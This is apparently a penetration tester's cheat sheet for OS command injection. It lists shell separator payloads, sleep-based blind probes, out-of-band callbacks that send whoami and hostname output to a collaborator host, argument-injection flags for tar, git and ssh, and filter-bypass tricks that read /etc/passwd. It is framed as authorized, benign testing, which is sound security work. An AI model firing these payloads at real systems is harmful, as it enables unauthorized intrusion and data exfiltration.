# OS Command Injection

Input concatenated into a shell call — ping/nslookup tools, image/PDF converters (ImageMagick, ffmpeg), archive handlers, filename params, git/svn wrappers. Prove with a benign command or callback; never destructive.

## Tier 1 — Separators
Chain your command onto theirs. Try each separator.
```
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id            # newline
%0d%0a id
```
Wrap to survive quoting context:
```
"; id; "
'; id; '
$(id)
```

## Tier 2 — Blind: time-based
No output returned. Confirm with a delay.
```
; sleep 5
| sleep 5
& ping -c 5 127.0.0.1 &
`sleep 5`
$(sleep 5)
; sleep 5 #                    # comment out trailing args
%0asleep%205
```
Windows:
```
& timeout /t 5
& ping -n 5 127.0.0.1
```

## Tier 2 — Blind: OOB
Exfil/confirm via DNS or HTTP callback (works when egress is open but stdout isn't).
```
; nslookup $(whoami).YOURID.oast.fun
| curl http://YOURID.oast.fun/$(whoami)
`wget -qO- http://YOURID.oast.fun/`
$(dig $(hostname).YOURID.oast.fun)
& nslookup YOURID.oast.fun     # windows
```

## Tier 3 — Argument injection
No separator needed — you control an argv slot. Abuse a flag that runs code.
```
--output=/path       # write primitive
tar: --checkpoint=1 --checkpoint-action=exec=sh\ -c\ id
curl: -o /tmp/x -K /path/config     # read arbitrary config
git: --upload-pack='sh -c "id"'
ssh: -oProxyCommand=;id
find: -exec id ;
```
Look for params passed raw to a CLI where a leading `-` is accepted.

## Tier 3 — Filter / WAF bypass
When keywords/spaces/chars are stripped.
```
i''d ; d\i\g              # quote/backslash break tokens
$IFS                     # space alternative:  cat$IFS/etc/passwd
{cat,/etc/passwd}        # brace expansion, no spaces
cat</etc/passwd          # redirection instead of arg
w'h'o'am'i
$(printf '\x69\x64')     # build 'id' from hex
$(rev<<<di)              # 'id' reversed
a=i;b=d;$a$b             # var concat
```

## Stop when
One benign command output (`uid=...` from `id`, or `hostname`) returned in-band, OR one DNS/HTTP callback for blind, OR a reproducible `sleep` delay. That is critical impact — capture request + evidence and stop. Do not read sensitive files, spawn reverse shells, or persist. One `id` is enough.
